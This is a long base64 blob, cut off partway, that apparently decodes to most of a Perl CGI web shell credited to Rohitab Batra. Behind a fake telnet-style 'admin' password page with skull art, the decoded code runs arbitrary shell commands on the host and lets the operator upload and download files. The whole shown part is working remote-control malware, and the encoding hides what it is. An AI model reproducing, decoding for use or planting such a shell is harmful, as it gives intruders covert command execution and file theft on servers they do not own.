QUU4MzAwIj7CqSAyMDAxLCBSb2hpdGFiIEJhdHJhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgICAgICAgICAgICAgIC4tJnF1b3Q7ICAgICAgJnF1b3Q7LS4KICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICB8CiAgICAgICAgICAgICAgICAgfCwgIC4tLiAgLi0uICAsfAogICAgICAgICAgICAgICAgIHwgKShfby8gIFxvXykoIHwKICAgICAgICAgICAgICAgICB8LyAgICAgL1wgICAgIFx8CiAgICAgICAoQF8gICAgICAgKF8gICAgIF5eICAgICBfKQogIF8gICAgICkgXDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+XDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnxJSUlJSUl8PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+LzwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fX19fX19fX19fX19fX19fX18KPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gKF8pPC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5AOEA4PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj57fTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+Jmx0O19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58LVxJSUlJSUkvLXw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fXyZndDs8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPgogICAgICAgIClfLyAgICAgICAgXCAgICAgICAgICAvIAogICAgICAgKEAgICAgICAgICAgIGAtLS0tLS0tLWAKICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+VyBBIFIgTiBJIE4gRzogUHJpdmF0ZSBTZXJ2ZXI8L2ZvbnQ+PC9wcmU+CiQ7CiMnCglwcmludCA8PEVORDsKPGNvZGU+ClRyeWluZyAkU2VydmVyTmFtZS4uLjxicj4KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPgpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dCjxjb2RlPiRNZXNzYWdlCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxicj5sb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5Gb3JtCnsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CmxvZ2luOiBhZG1pbjxicj4KcGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlRm9vdGVyCnsKCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ291dAp7CglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkmUHJpbnRMb2dvdXRTY3JlZW47CgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QKIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoJCX0KCQkmUHJpbnRMb2dpbkZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPgokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjwvZm9ybT4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KJFByb21wdCB1cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bwojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgo8Y29kZT4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLgo8YnI+S2lsbGVkIGl0IQo8Y29kZT4KRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOwoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7Cgl9CgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsKCQlpZighJFdpbk5UKQoJCXsKCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsKCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJCX0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkCgkJewoJCQkkfD0xOwoJCQkkQ29tbWFuZCAuPSAiIHwiOwoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQoJCQl7CgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJCXByaW50ICIkX1xuIjsKCQkJfQoJCQkkfD0wOwoJCX0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMKCQl7CgkJCXByaW50IGAkQ29tbWFuZGA7CgkJfQoJCWlmKCEkV2luTlQpCgkJewoJCQlhbGFybSgwKTsKCQl9CgkJcHJpbnQgIjwveG1wPiI7Cgl9CgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcgojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaAojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlCnsKCWxvY2FsKCRGaWxlVXJsKSA9IEBfOwoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzCgl7CgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3NlcgoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7CgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lgo8L2NvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJfQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1B